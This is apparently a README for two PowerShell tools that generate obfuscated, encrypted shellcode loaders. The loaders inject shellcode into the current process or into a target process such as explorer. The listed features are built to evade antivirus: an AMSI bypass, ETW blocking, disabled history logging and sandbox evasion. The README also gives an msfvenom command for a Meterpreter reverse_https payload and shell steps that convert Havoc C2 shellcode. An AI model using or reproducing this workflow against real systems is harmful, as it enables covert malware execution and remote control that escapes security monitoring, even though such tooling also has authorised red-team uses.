--------------------------------------
### Invoke-PoSH-ShellCodeLoader1.ps1
--------------------------------------
'Invoke-PoSH-ShellCodeLoader1' is a shellcode loader generator that aims to bypass AV solutions such as Windows Defender.  
It generates an obfuscated and encrypted shellcode loader script that will inject the shellcode into the current process's virtual address space.  

> Features
  - Shellcode injection into the memory of the current process (PowerShell)
  - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
  - AMSI bypass
  - Blocking Event Tracing for Windows (ETW)
  - Disabling PowerShell history logging
  - Basic sandbox evasion techniques (optional)
    - stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
    - wait for 60 seconds before execution

> Usage
1. Example with a shellcode file stored locally
```
  - Import-Module ./Invoke-PoSH-ShellCodeLoader1.ps1
  - Invoke-PoSH-ShellCodeLoader1 -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1
  --- or ---
  - Invoke-PoSH-ShellCodeLoader1 -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1 -Sandbox
```
2. Example with a shellcode file stored on a remote web server
```
  - Import-Module ./Invoke-PoSH-ShellCodeLoader1.ps1
  - Invoke-PoSH-ShellCodeLoader1 -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1  
  --- or ---
  - Invoke-PoSH-ShellCodeLoader1 -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1 -Sandbox
```

> Input 
  - Shellcode format (e.g. [Byte[]] $buf = 0xfc,0x48,0x83,...)
  - Metasploit C2 Framework  
  ```msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=X.X.X.X LPORT=443 -a x64 -f ps1 -o shellcode```
  
> License
  - GNU General Public License v3.0

--------------------------------------
### Invoke-PoSH-ShellCodeLoader2.ps1
--------------------------------------
'Invoke-PoSH-ShellCodeLoader2' is a shellcode loader generator that aims to bypass AV solutions such as Windows Defender.  
It generates an obfuscated and encrypted shellcode loader script that will inject the shellcode into a target process's virtual address space.  

> Features
  - Shellcode injection into the memory of a target process
  - AES encryption and GZip compression (based on 'Xencrypt')
  - AMSI bypass
  - Blocking Event Tracing for Windows (ETW)
  - Disabling PowerShell history logging
  - Basic sandbox evasion techniques (optional)
    - stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
    - wait for 60 seconds before execution

> Usage
1. Example with a shellcode file stored locally
```
  - Import-Module ./Invoke-PoSH-ShellCodeLoader2.ps1
  - Invoke-PoSH-ShellCodeLoader2 -FilePath C:\path\shellcode -TargetProcess explorer -OutFile C:\path\Packed-ShellcodeLoader.ps1 
    --- or ---
  - Invoke-PoSH-ShellCodeLoader2 -FilePath C:\path\shellcode -TargetProcess explorer -OutFile C:\path\Packed-ShellcodeLoader.ps1 -Sandbox
```
2. Example with a shellcode file stored on a remote web server
```
  - Import-Module ./Invoke-PoSH-ShellCodeLoader2.ps1
  - Invoke-PoSH-ShellCodeLoader2 -FileUrl https://URL/shellcode -TargetProcess explorer -OutFile C:\path\Packed-ShellcodeLoader.ps1
    --- or ---
  - Invoke-PoSH-ShellCodeLoader2 -FileUrl https://URL/shellcode -TargetProcess explorer -OutFile C:\path\Packed-ShellcodeLoader.ps1 -Sandbox
```

> Input 
  - Shellcode format (e.g. [Byte[]] $buf = 0xfc,0x48,0x83,...)
  - Metasploit C2 Framework  
  ```msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=X.X.X.X LPORT=443 -a x64 -f ps1 -o shellcode```
  - Havoc C2 Framework  
    1. Generate a new HAVOC payload with the format "Windows Shellcode" (Arch: x64 / Indirect Syscall: Enabled / Sleep Technique: WaitForSIngleObjectEx)  
    2. To convert the Havoc shellcode to the "PS1" format you need to run these commands:  
     ```$ xxd -p HavocShellCode | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > HavocShellcode1```  
     ```$ sed '$ s/.$//' HavocShellcode1 > HavocShellcode2```  
     ```$ sed -i '1s/^/[Byte[]] $buf = /' HavocShellcode2```  

> License
  - GNU General Public License v3.0
